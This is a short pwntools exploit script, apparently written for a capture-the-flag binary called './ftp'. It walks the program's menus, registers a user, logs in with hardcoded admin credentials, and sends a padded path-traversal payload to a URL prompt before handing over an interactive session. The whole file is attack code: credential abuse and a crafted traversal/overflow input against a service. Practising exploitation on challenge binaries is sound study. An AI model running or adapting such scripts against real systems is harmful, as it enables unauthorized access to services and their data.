#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './ftp'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil("Choice:")
    io.send(chr(idx))

def join(name, age, idx, passwd):
    menu(1)
    io.recvuntil("Name:")
    io.sendline(name)
    io.recvuntil("Age:")
    io.sendline(str(age))
    io.recvuntil("ID:")
    io.sendline(str(idx))
    io.recvuntil("PW:")
    io.sendline(passwd)

def login(name, passwd):
    menu(3)
    io.recvuntil("id")
    io.sendline(name)
    io.recvuntil("pw")
    io.sendline(passwd)

menu(3)
join('lowkey', 3, 2, 'lowkey')
login('admin', 'P3ssw0rd')
menu(5)
io.recvuntil("URL")
io.send("/AAAAAAAAAAAAAAAAAAAAAAAAAA/../../BBBBBBBBBBBBBBBBBBBB")




io.interactive()
